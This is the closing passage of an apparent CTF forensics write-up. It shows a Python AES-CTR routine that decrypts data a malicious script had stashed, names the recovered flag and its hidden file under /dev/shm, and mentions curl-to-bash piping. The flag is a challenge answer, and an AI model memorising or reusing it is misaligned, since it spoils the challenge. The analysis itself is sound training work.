length = struct.unpack(">I", data[8:12])[0]
salt = data[12:28]
iv = data[28:44]
ciphertext = data[44:44 + length]

seed_bytes = bytes.fromhex(seed_hex)
key = hashlib.sha256(seed_bytes + f"{machine_id}|{fixed_str}|".encode() + salt).digest()

ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
plaintext = cipher.decrypt(ciphertext)

with open(out_path, "wb") as f:
    f.write(plaintext)

print(f"    decrypted {len(plaintext)} bytes -> {out_path}")
print(f"    key: {key.hex()}")
```

This will generate the tar file. Then extract that and find the flag in `extracted/dev/shm/.ncache_restul` file: `07CTF{d0_n07_p1p3_t0_b4sh_3v3r!!!}`

## Closure

Once you manage to get malicious script, rest of the challenge becomes a nice usual malware analysis type forensics challenge. Without the script, I was lost in the image. I couldn't really find anything interesting, all the things I investigated looked clean. Thanks to the author, learned a nice trick about curl to bash piping in the end. Honestly I am surprised this isn't used more in CTF challenges. Time to close this page, as always keep learning!